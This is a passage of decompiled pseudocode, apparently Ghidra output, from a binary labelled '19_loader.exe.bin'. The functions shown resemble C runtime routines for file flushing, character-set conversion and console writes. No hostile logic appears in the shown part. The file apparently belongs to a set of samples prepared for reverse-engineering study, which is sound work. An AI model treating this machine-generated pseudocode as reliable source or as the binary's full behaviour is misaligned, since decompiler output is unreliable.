      pWVar9 = (LPCWSTR)0x0;
      puVar12 = auStackY_88 + lVar5;
      if (puVar13 == (undefined4 *)0x0) goto LAB_14001d061;
      *puVar13 = 0xcccc;
LAB_14001ce7c:
      pWVar9 = (LPCWSTR)(puVar13 + 4);
      puVar11 = puVar10;
    }
    else {
      puVar13 = FUN_140019a00(uVar4);
      puVar11 = auStackY_88;
      puVar10 = auStackY_88;
      pWVar9 = (LPCWSTR)0x0;
      if (puVar13 != (undefined4 *)0x0) {
        *puVar13 = 0xdddd;
        goto LAB_14001ce7c;
      }
    }
    puVar12 = puVar11;
    if (pWVar9 == (LPCWSTR)0x0) goto LAB_14001d061;
    *(uint *)(puVar11 + 0x28) = uVar2;
    *(LPCWSTR *)(puVar11 + 0x20) = pWVar9;
    *(undefined8 *)(puVar11 + -8) = 0x14001cea6;
    iVar3 = FUN_140019c24(param_8,1,param_4,iVar3,*(LPWSTR *)(puVar11 + 0x20),
                          *(int *)(puVar11 + 0x28));
    if (iVar3 == 0) goto LAB_14001d061;
    *(undefined8 *)(puVar11 + 0x40) = 0;
    *(undefined8 *)(puVar11 + 0x38) = 0;
    *(undefined8 *)(puVar11 + 0x30) = 0;
    *(undefined4 *)(puVar11 + 0x28) = 0;
    *(undefined8 *)(puVar11 + 0x20) = 0;
    *(undefined8 *)(puVar11 + -8) = 0x14001ced9;
    iVar3 = FUN_140016650(param_2,param_3,pWVar9,uVar2,*(LPWSTR *)(puVar11 + 0x20),
                          *(int *)(puVar11 + 0x28),*(undefined8 *)(puVar11 + 0x30),
                          *(undefined8 *)(puVar11 + 0x38),*(undefined8 *)(puVar11 + 0x40));
    uVar8 = 0;
    if (iVar3 == 0) goto LAB_14001d061;
    if ((param_3 & 0x400) == 0) {
      uVar4 = (longlong)iVar3 * 2 + 0x10;
      uVar4 = -(ulonglong)((ulonglong)((longlong)iVar3 * 2) < uVar4) & uVar4;
      if (uVar4 == 0) {
        puVar13 = (undefined4 *)0x0;
LAB_14001d044:
        if (puVar13 != (undefined4 *)0x0) {
LAB_14001d049:
          if (puVar13[-4] == 0xdddd) {
            *(undefined8 *)(puVar12 + -8) = 0x14001d05a;
            FUN_140017fb0(puVar13 + -4);
          }
        }
      }
      else {
        if (uVar4 < 0x401) {
          *(undefined8 *)(puVar11 + -8) = 0x14001cf7c;
          lVar5 = FUN_140013c00();
          lVar5 = -lVar5;
          puVar12 = puVar11 + lVar5;
          puVar6 = (undefined4 *)(puVar11 + lVar5 + 0x50);
          if (puVar6 == (undefined4 *)0x0) goto LAB_14001d068;
          *puVar6 = 0xcccc;
          puVar11 = puVar11 + lVar5;
LAB_14001cfaa:
          puVar13 = puVar6 + 4;
          puVar12 = puVar11;
        }
        else {
          *(undefined8 *)(puVar11 + -8) = 0x14001cf9a;
          puVar6 = FUN_140019a00(uVar4);
          uVar8 = 0;
          puVar13 = (undefined4 *)0x0;
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            goto LAB_14001cfaa;
          }
        }
        if (puVar13 != (undefined4 *)0x0) {
          *(undefined8 *)(puVar12 + 0x40) = uVar8;
          *(undefined8 *)(puVar12 + 0x38) = uVar8;
          *(undefined8 *)(puVar12 + 0x30) = uVar8;
          *(int *)(puVar12 + 0x28) = iVar3;
          *(undefined4 **)(puVar12 + 0x20) = puVar13;
          *(undefined8 *)(puVar12 + -8) = 0x14001cfe0;
          iVar1 = FUN_140016650(param_2,param_3,pWVar9,uVar2,*(LPWSTR *)(puVar12 + 0x20),
                                *(int *)(puVar12 + 0x28),*(undefined8 *)(puVar12 + 0x30),
                                *(undefined8 *)(puVar12 + 0x38),*(undefined8 *)(puVar12 + 0x40));
          if (iVar1 == 0) goto LAB_14001d044;
          *(undefined8 *)(puVar12 + 0x38) = 0;
          *(undefined8 *)(puVar12 + 0x30) = 0;
          if (param_7 == 0) {
            *(undefined4 *)(puVar12 + 0x28) = 0;
            *(undefined8 *)(puVar12 + 0x20) = 0;
            *(undefined8 *)(puVar12 + -8) = 0x14001d00e;
            iVar3 = FUN_14001b0e8(param_8,0,puVar13,iVar3);
            if (iVar3 == 0) goto LAB_14001d044;
          }
          else {
            *(int *)(puVar12 + 0x28) = param_7;
            *(undefined8 *)(puVar12 + 0x20) = param_6;
            *(undefined8 *)(puVar12 + -8) = 0x14001d028;
            iVar3 = FUN_14001b0e8(param_8,0,puVar13,iVar3);
            if (iVar3 == 0) goto LAB_14001d049;
          }
          if (puVar13[-4] == 0xdddd) {
            *(undefined8 *)(puVar12 + -8) = 0x14001d03f;
            FUN_140017fb0(puVar13 + -4);
          }
        }
      }
    }
    else if (param_7 != 0) {
      if (iVar3 <= param_7) {
        *(undefined8 *)(puVar11 + 0x40) = 0;
        *(undefined8 *)(puVar11 + 0x38) = 0;
        *(undefined8 *)(puVar11 + 0x30) = 0;
        *(int *)(puVar11 + 0x28) = param_7;
        *(undefined8 *)(puVar11 + 0x20) = param_6;
        *(undefined8 *)(puVar11 + -8) = 0x14001cf31;
        iVar3 = FUN_140016650(param_2,param_3,pWVar9,uVar2,*(LPWSTR *)(puVar11 + 0x20),
                              *(int *)(puVar11 + 0x28),*(undefined8 *)(puVar11 + 0x30),
                              *(undefined8 *)(puVar11 + 0x38),*(undefined8 *)(puVar11 + 0x40));
        if (iVar3 != 0) goto LAB_14001d068;
      }
      goto LAB_14001d061;
    }
  }
LAB_14001d068:
  if (*(int *)(pWVar9 + -8) == 0xdddd) {
    *(undefined8 *)(puVar12 + -8) = 0x14001d079;
    FUN_140017fb0(pWVar9 + -8);
  }
LAB_14001d07b:
  uVar4 = local_30 ^ (ulonglong)local_38;
  *(undefined8 *)(puVar12 + -8) = 0x14001d087;
  FUN_14001a2d0(uVar4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d0a4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d0a4 rva=0x1d0a4 */

void FUN_14001d0a4(longlong param_1,longlong *param_2)

{
  undefined **ppuVar1;
  
  if ((*param_2 != DAT_1400e1198) && ((DAT_1400e0520 & *(uint *)(param_1 + 0x3a8)) == 0)) {
    ppuVar1 = FUN_140019fe8();
    *param_2 = (longlong)ppuVar1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d0d8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d0d8 rva=0x1d0d8 */

void FUN_14001d0d8(longlong param_1,longlong *param_2)

{
  longlong lVar1;
  
  if ((*param_2 != DAT_1400e1158) && ((DAT_1400e0520 & *(uint *)(param_1 + 0x3a8)) == 0)) {
    lVar1 = FUN_1400173c0();
    *param_2 = lVar1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d10c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d10c rva=0x1d10c */

void FUN_14001d10c(longlong param_1,longlong *param_2,longlong param_3)

{
  undefined **ppuVar1;
  
  if ((*param_2 != (&DAT_1400e1198)[param_3]) && ((DAT_1400e0520 & *(uint *)(param_1 + 0x3a8)) == 0)
     ) {
    ppuVar1 = FUN_140019fe8();
    *param_2 = (longlong)ppuVar1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d144 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d144 rva=0x1d144 */

void FUN_14001d144(longlong param_1,longlong *param_2,longlong param_3)

{
  longlong lVar1;
  
  if ((*param_2 != (&DAT_1400e1158)[param_3]) && ((DAT_1400e0520 & *(uint *)(param_1 + 0x3a8)) == 0)
     ) {
    lVar1 = FUN_1400173c0();
    *param_2 = lVar1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d17c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d17c rva=0x1d17c */

uint FUN_14001d17c(void)

{
  undefined8 uVar1;
  
  uVar1 = FUN_1400173dc();
  return (uint)uVar1 & 0xff ^ 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d190 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d190 rva=0x1d190 */

undefined8 FUN_14001d190(uint param_1)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  uint local_res8 [2];
  undefined1 local_res10 [8];
  uint local_res18 [2];
  uint local_res20 [2];
  uint *local_18 [3];
  
  local_res8[0] = param_1;
  if (param_1 == 0xfffffffe) {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 9;
  }
  else {
    if (((-1 < (int)param_1) && (param_1 < DAT_1400e1140)) &&
       ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                  (ulonglong)(param_1 & 0x3f) * 0x48) & 1) != 0)) {
      local_18[0] = local_res8;
      local_res18[0] = param_1;
      local_res20[0] = param_1;
      uVar2 = FUN_14001d224(local_res10,local_res20,local_18,local_res18);
      return uVar2;
    }
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 9;
    FUN_1400180c4();
  }
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d224 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d224 rva=0x1d224 */

undefined8 FUN_14001d224(undefined8 param_1,uint *param_2,undefined8 *param_3,uint *param_4)

{
  uint uVar1;
  BOOL BVar2;
  DWORD DVar3;
  HANDLE hFile;
  DWORD *pDVar4;
  undefined8 *puVar5;
  undefined8 uVar6;
  
  FUN_14001b9f4(*param_2);
  uVar1 = *(uint *)*param_3;
  if ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)uVar1 >> 6] + 0x38 +
                (ulonglong)(uVar1 & 0x3f) * 0x48) & 1) != 0) {
    hFile = (HANDLE)FUN_14001b720(uVar1);
    BVar2 = FlushFileBuffers(hFile);
    uVar6 = 0;
    if (BVar2 != 0) goto LAB_14001d29b;
    DVar3 = GetLastError();
    pDVar4 = (DWORD *)FUN_140018e10();
    *pDVar4 = DVar3;
  }
  puVar5 = FUN_140018dec();
  *(undefined4 *)puVar5 = 9;
  uVar6 = 0xffffffff;
LAB_14001d29b:
  FUN_14001ba1c(*param_4);
  return uVar6;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d2b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d2b0 rva=0x1d2b0 */

undefined4 FUN_14001d2b0(longlong param_1)

{
  undefined4 uVar1;
  undefined8 *puVar2;
  
  if (param_1 == 0) {
    puVar2 = FUN_140018dec();
    *(undefined4 *)puVar2 = 0x16;
    FUN_1400180c4();
    uVar1 = 0xffffffff;
  }
  else {
    uVar1 = *(undefined4 *)(param_1 + 0x18);
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d2d8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d2d8 rva=0x1d2d8 */

int FUN_14001d2d8(uint param_1,byte *param_2,uint param_3,longlong *param_4)

{
  char cVar1;
  int iVar2;
  undefined8 uVar3;
  byte bVar4;
  short sVar5;
  short sVar6;
  BOOL BVar7;
  DWORD DVar8;
  int iVar9;
  ulonglong uVar10;
  undefined7 extraout_var;
  undefined8 *puVar11;
  int iVar12;
  longlong lVar13;
  ulonglong uVar14;
  byte *pbVar15;
  undefined1 in_stack_ffffffffffffff78;
  undefined8 local_70;
  int local_68;
  undefined8 local_60;
  DWORD local_50 [4];
  
  iVar12 = 0;
  uVar14 = (ulonglong)param_3;
  if (param_3 == 0) {
    return 0;
  }
  if (param_2 == (byte *)0x0) {
LAB_14001d308:
    *(undefined1 *)(param_4 + 7) = 1;
    *(undefined4 *)((longlong)param_4 + 0x34) = 0;
    *(undefined1 *)(param_4 + 6) = 1;
    *(undefined4 *)((longlong)param_4 + 0x2c) = 0x16;
    FUN_1400182a4(0,0,0,0,0,param_4);
    return -1;
  }
  uVar10 = (ulonglong)(param_1 & 0x3f);
  lVar13 = (longlong)(int)param_1 >> 6;
  cVar1 = *(char *)((&DAT_1400e0d40)[lVar13] + 0x39 + uVar10 * 0x48);
  if (((byte)(cVar1 - 1U) < 2) && ((~param_3 & 1) == 0)) goto LAB_14001d308;
  if ((*(byte *)((&DAT_1400e0d40)[lVar13] + 0x38 + uVar10 * 0x48) & 0x20) != 0) {
    thunk_FUN_140020f50(param_1,(LARGE_INTEGER)0x0,2,(longlong)param_4);
  }
  local_60 = 0;
  bVar4 = FUN_14001e04c(param_1);
  if (((int)CONCAT71(extraout_var,bVar4) == 0) ||
     (-1 < *(char *)((&DAT_1400e0d40)[lVar13] + 0x38 + uVar10 * 0x48))) {
LAB_14001d4c0:
    if (-1 < *(char *)((&DAT_1400e0d40)[lVar13] + 0x38 + (ulonglong)(param_1 & 0x3f) * 0x48)) {
      local_70 = 0;
      local_68 = 0;
      BVar7 = WriteFile(*(HANDLE *)
                         ((&DAT_1400e0d40)[lVar13] + 0x28 + (ulonglong)(param_1 & 0x3f) * 0x48),
                        param_2,param_3,(LPDWORD)((longlong)&local_70 + 4),(LPOVERLAPPED)0x0);
      iVar12 = local_68;
      uVar3 = local_70;
      if (BVar7 == 0) {
        DVar8 = GetLastError();
        local_70 = CONCAT44(local_70._4_4_,DVar8);
        iVar12 = local_68;
        uVar3 = local_70;
      }
      goto LAB_14001d575;
    }
    if (cVar1 == '\0') {
      puVar11 = (undefined8 *)
                FUN_14001dbbc((DWORD *)&local_70,param_1,(char *)param_2,uVar14,
                              in_stack_ffffffffffffff78);
    }
    else if (cVar1 == '\x01') {
      puVar11 = (undefined8 *)
                FUN_14001dde0((DWORD *)&local_70,param_1,(short *)param_2,param_3,
                              in_stack_ffffffffffffff78);
    }
    else {
      uVar3 = local_60;
      if (cVar1 != '\x02') goto LAB_14001d575;
      puVar11 = (undefined8 *)
                FUN_14001dcc4((DWORD *)&local_70,param_1,(short *)param_2,uVar14,
                              in_stack_ffffffffffffff78);
    }
  }
  else {
    if ((char)param_4[5] == '\0') {
      FUN_14001bad0(param_4);
    }
    if ((*(longlong *)(param_4[3] + 0x138) == 0) &&
       (*(char *)((&DAT_1400e0d40)[lVar13] + 0x39 + uVar10 * 0x48) == '\0')) goto LAB_14001d4c0;
    local_50[0] = 0;
    BVar7 = GetConsoleMode(*(HANDLE *)((&DAT_1400e0d40)[lVar13] + 0x28 + uVar10 * 0x48),local_50);
    if (BVar7 == 0) goto LAB_14001d4c0;
    if (cVar1 != '\0') {
      if ((cVar1 == '\x01') || (uVar3 = local_60, cVar1 == '\x02')) {
        local_70 = 0;
        uVar3 = local_70;
        if (param_2 < param_2 + uVar14) {
          local_70._4_4_ = 0;
          pbVar15 = param_2;
          iVar9 = local_70._4_4_;
          do {
            sVar6 = *(short *)pbVar15;
            sVar5 = FUN_140021000(sVar6);
            if (sVar5 != sVar6) {
LAB_14001d488:
              DVar8 = GetLastError();
              local_70 = CONCAT44(local_70._4_4_,DVar8);
              uVar3 = local_70;
              break;
            }
            local_70 = CONCAT44(iVar9 + 2,(DWORD)local_70);
            iVar2 = iVar9 + 2;
            if (sVar6 == 10) {
              sVar6 = FUN_140021000(0xd);
              if (sVar6 != 0xd) goto LAB_14001d488;
              local_70 = CONCAT44(iVar9 + 3,(DWORD)local_70);
              iVar12 = iVar12 + 1;
              iVar2 = iVar9 + 3;
            }
            iVar9 = iVar2;
            pbVar15 = pbVar15 + 2;
            uVar3 = local_70;
          } while (pbVar15 < param_2 + uVar14);
        }
      }
      goto LAB_14001d575;
    }
    puVar11 = (undefined8 *)FUN_14001d728((DWORD *)&local_70,param_1,param_2,uVar14,param_4);
  }
  iVar12 = *(int *)(puVar11 + 1);
  uVar3 = *puVar11;
LAB_14001d575:
  local_60 = uVar3;
  iVar9 = (int)((ulonglong)local_60 >> 0x20);
  if (iVar9 != 0) {
    return iVar9 - iVar12;
  }
  if ((uint)local_60 != 0) {
    if ((uint)local_60 == 5) {
      *(undefined1 *)(param_4 + 6) = 1;
      *(undefined4 *)((longlong)param_4 + 0x2c) = 9;
      *(undefined1 *)(param_4 + 7) = 1;
      *(undefined4 *)((longlong)param_4 + 0x34) = 5;
      return -1;
    }
    FUN_140018f2c((uint)local_60,(longlong)param_4);
    return -1;
  }
  if (((*(byte *)((&DAT_1400e0d40)[lVar13] + 0x38 + (ulonglong)(param_1 & 0x3f) * 0x48) & 0x40) == 0
      ) || (*param_2 != 0x1a)) {
    *(undefined4 *)((longlong)param_4 + 0x34) = 0;
    *(undefined1 *)(param_4 + 6) = 1;
    *(undefined4 *)((longlong)param_4 + 0x2c) = 0x1c;
    *(undefined1 *)(param_4 + 7) = 1;
    return -1;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d608 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d608 rva=0x1d608 */

int FUN_14001d608(uint param_1,byte *param_2,uint param_3,longlong *param_4)

{
  bool bVar1;
  int iVar2;
  
  if (param_1 == 0xfffffffe) {
    *(undefined1 *)(param_4 + 7) = 1;
    *(undefined4 *)((longlong)param_4 + 0x34) = 0;
    *(undefined1 *)(param_4 + 6) = 1;
    *(undefined4 *)((longlong)param_4 + 0x2c) = 9;
  }
  else {
    if (((int)param_1 < 0) || (DAT_1400e1140 <= param_1)) {
      bVar1 = false;
    }
    else {
      bVar1 = true;
    }
    if (bVar1) {
      if ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                    (ulonglong)(param_1 & 0x3f) * 0x48) & 1) != 0) {
        FUN_14001b9f4(param_1);
        iVar2 = -1;
        if ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                      (ulonglong)(param_1 & 0x3f) * 0x48) & 1) == 0) {
          *(undefined1 *)(param_4 + 6) = 1;
          *(undefined4 *)((longlong)param_4 + 0x2c) = 9;
          *(undefined1 *)(param_4 + 7) = 1;
          *(undefined4 *)((longlong)param_4 + 0x34) = 0;
        }
        else {
          iVar2 = FUN_14001d2d8(param_1,param_2,param_3,param_4);
        }
        FUN_14001ba1c(param_1);
        return iVar2;
      }
    }
    *(undefined1 *)(param_4 + 7) = 1;
    *(undefined4 *)((longlong)param_4 + 0x34) = 0;
    *(undefined1 *)(param_4 + 6) = 1;
    *(undefined4 *)((longlong)param_4 + 0x2c) = 9;
    FUN_1400182a4(0,0,0,0,0,param_4);
  }
  return -1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1d728 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001d728 rva=0x1d728 */

void FUN_14001d728(DWORD *param_1,uint param_2,byte *param_3,ulonglong param_4,longlong *param_5)

{
  char cVar1;
  byte bVar2;
  HANDLE hFile;
  uint uVar3;
  BOOL BVar4;
  ulonglong uVar5;
  char *pcVar6;
  int iVar7;
  DWORD DVar8;
  undefined1 *puVar9;
  byte *pbVar10;
  int iVar11;
  longlong lVar12;
  ulonglong uVar13;
  longlong lVar14;
  longlong lVar15;
  longlong lVar16;
  undefined1 auStackY_108 [32];
  undefined2 local_c8 [2];
  WCHAR local_c4 [2];
  DWORD local_c0 [2];
  byte *local_b8;
  longlong *local_b0;
  uint local_a8 [2];
  UINT local_a0;
  int local_9c;
  byte *local_98;
  longlong local_90;
  uint local_88 [2];
  undefined8 *local_80;
  byte *local_78;
  HANDLE local_70;
  longlong local_68;
  undefined8 local_60;
  undefined8 local_58;
  byte local_50;
  byte local_4f;
  undefined1 local_48 [8];
  ulonglong local_40;
  
  local_60 = 0xfffffffffffffffe;
  local_40 = DAT_1400dfc40 ^ (ulonglong)auStackY_108;
  local_b0 = param_5;
  lVar14 = (longlong)(int)param_2 >> 6;
  uVar5 = (ulonglong)(param_2 & 0x3f);
  local_70 = *(HANDLE *)((&DAT_1400e0d40)[lVar14] + 0x28 + uVar5 * 0x48);
  local_b8 = param_3 + (param_4 & 0xffffffff);
  local_98 = param_3;
  local_90 = lVar14;
  local_a0 = GetConsoleOutputCP();
  iVar11 = 0;
  if ((char)local_b0[5] == '\0') {
    FUN_14001bad0(local_b0);
  }
  local_9c = *(int *)(local_b0[3] + 0xc);
  param_1[0] = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  if (local_98 < param_3 + (param_4 & 0xffffffff)) {
    DVar8 = 0;
    local_68 = lVar14;
    do {
      local_c8[0] = CONCAT11(local_c8[0]._1_1_,*param_3);
      local_c4[0] = L'\0';
      local_c4[1] = L'\0';
      uVar3 = 1;
      if (local_9c == 0xfde9) {
        iVar7 = 0;
        lVar15 = 0;
        pcVar6 = (char *)(uVar5 * 0x48 + 0x3e + (&DAT_1400e0d40)[local_68]);
        do {
          if (*pcVar6 == '\0') break;
          iVar7 = iVar7 + 1;
          lVar15 = lVar15 + 1;
          pcVar6 = pcVar6 + 1;
        } while (lVar15 < 5);
        if (lVar15 < 1) {
          cVar1 = (&DAT_1400e0540)[*param_3];
          iVar7 = cVar1 + 1;
          lVar14 = (longlong)local_b8 - (longlong)param_3;
          if (lVar14 < iVar7) {
            if (0 < lVar14) {
              lVar15 = 0;
              do {
                *(byte *)(lVar15 + uVar5 * 0x48 + 0x3e + (&DAT_1400e0d40)[local_90]) =
                     param_3[lVar15];
                iVar11 = iVar11 + 1;
                lVar15 = lVar15 + 1;
              } while (iVar11 < lVar14);
            }
            param_1[1] = param_1[1] + (int)lVar14;
            break;
          }
          local_a8[0] = 0;
          local_a8[1] = 0;
          uVar3 = (iVar7 == 4) + 1;
          local_78 = param_3;
          lVar14 = FUN_140020ac0((ushort *)local_c4,&local_78,(ulonglong)uVar3,local_a8,
                                 (longlong)local_b0);
          if (lVar14 == -1) break;
          pbVar10 = param_3 + cVar1;
          lVar14 = local_90;
        }
        else {
          cVar1 = (&DAT_1400e0540)[*(byte *)((&DAT_1400e0d40)[lVar14] + 0x3e + uVar5 * 0x48)];
          iVar7 = (cVar1 + 1) - iVar7;
          local_a8[0] = iVar7;
          lVar12 = (longlong)local_b8 - (longlong)param_3;
          uVar13 = (ulonglong)iVar7;
          if (lVar12 < (longlong)uVar13) {
            if (0 < lVar12) {
              lVar16 = lVar15;
              do {
                *(byte *)(lVar16 + uVar5 * 0x48 + 0x3e + (&DAT_1400e0d40)[lVar14]) =
                     param_3[lVar16 - lVar15];
                iVar11 = iVar11 + 1;
                lVar16 = lVar16 + 1;
              } while (iVar11 < lVar12);
            }
            param_1[1] = param_1[1] + (int)lVar12;
            break;
          }
          lVar12 = 0;
          puVar9 = (undefined1 *)(uVar5 * 0x48 + 0x3e + (&DAT_1400e0d40)[local_68]);
          do {
            local_48[lVar12 + -0x10] = *puVar9;
            lVar12 = lVar12 + 1;
            puVar9 = puVar9 + 1;
          } while (lVar12 < lVar15);
          if (0 < (longlong)uVar13) {
            FUN_140021f30((undefined8 *)(local_48 + lVar15 + -0x10),(undefined8 *)param_3,uVar13);
          }
          lVar12 = 0;
          do {
            *(undefined1 *)(lVar12 + uVar5 * 0x48 + 0x3e + (&DAT_1400e0d40)[lVar14]) = 0;
            lVar12 = lVar12 + 1;
          } while (lVar12 < lVar15);
          local_88[0] = 0;
          local_88[1] = 0;
          local_80 = &local_58;
          uVar3 = (cVar1 + 1 == 4) + 1;
          lVar15 = FUN_140020ac0((ushort *)local_c4,&local_80,(ulonglong)uVar3,local_88,
                                 (longlong)local_b0);
          if (lVar15 == -1) break;
          pbVar10 = param_3 + (int)(local_a8[0] - 1);
        }
      }
      else {
        lVar15 = (&DAT_1400e0d40)[lVar14];
        bVar2 = *(byte *)(lVar15 + 0x3d + uVar5 * 0x48);
        if ((bVar2 & 4) == 0) {
          if (*(short *)(*(longlong *)local_b0[3] + (ulonglong)*param_3 * 2) < 0) {
            pbVar10 = param_3 + 1;
            if (pbVar10 < local_b8) {
              iVar7 = FUN_140020708(local_c4,param_3,2,local_b0);
              if (iVar7 != -1) goto LAB_14001da30;
            }
            else {
              *(byte *)(lVar15 + 0x3e + uVar5 * 0x48) = *param_3;
              pbVar10 = (byte *)((&DAT_1400e0d40)[lVar14] + 0x3d + uVar5 * 0x48);
              *pbVar10 = *pbVar10 | 4;
              param_1[1] = DVar8 + 1;
            }
            break;
          }
          uVar13 = 1;
          pbVar10 = param_3;
        }
        else {
          local_50 = *(byte *)(lVar15 + 0x3e + uVar5 * 0x48);
          local_4f = *param_3;
          *(byte *)(lVar15 + 0x3d + uVar5 * 0x48) = bVar2 & 0xfb;
          uVar13 = 2;
          pbVar10 = &local_50;
        }
        iVar7 = FUN_140020708(local_c4,pbVar10,uVar13,local_b0);
        pbVar10 = param_3;
        if (iVar7 == -1) break;
      }
LAB_14001da30:
      param_3 = pbVar10 + 1;
      uVar3 = FUN_14001b0e8(local_a0,0,local_c4,uVar3);
      hFile = local_70;
      if (uVar3 == 0) break;
      local_c0[0] = 0;
      BVar4 = WriteFile(local_70,local_48,uVar3,local_c0,(LPOVERLAPPED)0x0);
      if (BVar4 == 0) {
LAB_14001db89:
        DVar8 = GetLastError();
        *param_1 = DVar8;
        break;
      }
      DVar8 = (param_1[2] - (int)local_98) + (int)param_3;
      param_1[1] = DVar8;
      if (local_c0[0] < uVar3) break;
      if ((char)local_c8[0] == '\n') {
        local_c8[0] = 0xd;
        BVar4 = WriteFile(hFile,local_c8,1,local_c0,(LPOVERLAPPED)0x0);
        if (BVar4 == 0) goto LAB_14001db89;
        if (local_c0[0] == 0) break;
        param_1[2] = param_1[2] + 1;
        param_1[1] = param_1[1] + 1;
        DVar8 = param_1[1];
      }
    } while (param_3 < local_b8);
  }
  FUN_14001a2d0(local_40 ^ (ulonglong)auStackY_108);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1dbbc | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001dbbc rva=0x1dbbc */

void FUN_14001dbbc(DWORD *param_1,uint param_2,char *param_3,ulonglong param_4,undefined1 param_5)

{
  char cVar1;
  uint uVar2;
  HANDLE hFile;
  ulonglong uVar3;
  BOOL BVar4;
  DWORD DVar5;
  longlong lVar6;
  uint nNumberOfBytesToWrite;
  char *pcVar7;
  char *pcVar8;
  undefined8 uStack_20;
  
  uStack_20 = 0x14001dbd4;
  lVar6 = FUN_140013c00();
  lVar6 = -lVar6;
  *(ulonglong *)((longlong)register0x00000020 + lVar6 + 0x1428) =
       DAT_1400dfc40 ^ (longlong)register0x00000020 + lVar6 + -0x18;
  pcVar8 = param_3 + (param_4 & 0xffffffff);
  hFile = *(HANDLE *)
           ((&DAT_1400e0d40)[(longlong)(int)param_2 >> 6] + 0x28 +
           (ulonglong)(param_2 & 0x3f) * 0x48);
  param_1[0] = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  do {
    if (pcVar8 <= param_3) break;
    pcVar7 = &param_5 + lVar6;
    do {
      if (pcVar8 <= param_3) break;
      cVar1 = *param_3;
      param_3 = param_3 + 1;
      if (cVar1 == '\n') {
        param_1[2] = param_1[2] + 1;
        *pcVar7 = '\r';
        pcVar7 = pcVar7 + 1;
      }
      *pcVar7 = cVar1;
      pcVar7 = pcVar7 + 1;
    } while (pcVar7 < (char *)((longlong)register0x00000020 + lVar6 + 0x1427));
    *(undefined4 *)((longlong)register0x00000020 + lVar6 + 0x18) = 0;
    *(undefined8 *)((longlong)register0x00000020 + lVar6 + 8) = 0;
    nNumberOfBytesToWrite = (int)pcVar7 - ((int)&param_5 + (int)lVar6);
    *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001dc7a;
    BVar4 = WriteFile(hFile,&param_5 + lVar6,nNumberOfBytesToWrite,
                      (LPDWORD)((longlong)register0x00000020 + lVar6 + 0x18),
                      *(LPOVERLAPPED *)((longlong)register0x00000020 + lVar6 + 8));
    if (BVar4 == 0) {
      *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001dc96;
      DVar5 = GetLastError();
      *param_1 = DVar5;
      break;
    }
    uVar2 = *(uint *)((longlong)register0x00000020 + lVar6 + 0x18);
    param_1[1] = param_1[1] + uVar2;
  } while (nNumberOfBytesToWrite <= uVar2);
  uVar3 = *(ulonglong *)((longlong)register0x00000020 + lVar6 + 0x1428);
  *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001dcab;
  FUN_14001a2d0(uVar3 ^ (longlong)register0x00000020 + lVar6 + -0x18);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1dcc4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001dcc4 rva=0x1dcc4 */

void FUN_14001dcc4(DWORD *param_1,uint param_2,short *param_3,ulonglong param_4,undefined1 param_5)

{
  short sVar1;
  uint uVar2;
  HANDLE hFile;
  ulonglong uVar3;
  uint nNumberOfBytesToWrite;
  BOOL BVar4;
  DWORD DVar5;
  longlong lVar6;
  short *psVar7;
  short *psVar8;
  undefined8 uStack_20;
  
  uStack_20 = 0x14001dcdc;
  lVar6 = FUN_140013c00();
  lVar6 = -lVar6;
  *(ulonglong *)((longlong)register0x00000020 + lVar6 + 0x1428) =
       DAT_1400dfc40 ^ (longlong)register0x00000020 + lVar6 + -0x18;
  psVar8 = (short *)((param_4 & 0xffffffff) + (longlong)param_3);
  hFile = *(HANDLE *)
           ((&DAT_1400e0d40)[(longlong)(int)param_2 >> 6] + 0x28 +
           (ulonglong)(param_2 & 0x3f) * 0x48);
  param_1[0] = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  do {
    if (psVar8 <= param_3) break;
    psVar7 = (short *)(&param_5 + lVar6);
    do {
      if (psVar8 <= param_3) break;
      sVar1 = *param_3;
      param_3 = param_3 + 1;
      if (sVar1 == 10) {
        param_1[2] = param_1[2] + 2;
        *psVar7 = 0xd;
        psVar7 = psVar7 + 1;
      }
      *psVar7 = sVar1;
      psVar7 = psVar7 + 1;
    } while (psVar7 < (short *)((longlong)register0x00000020 + lVar6 + 0x1426));
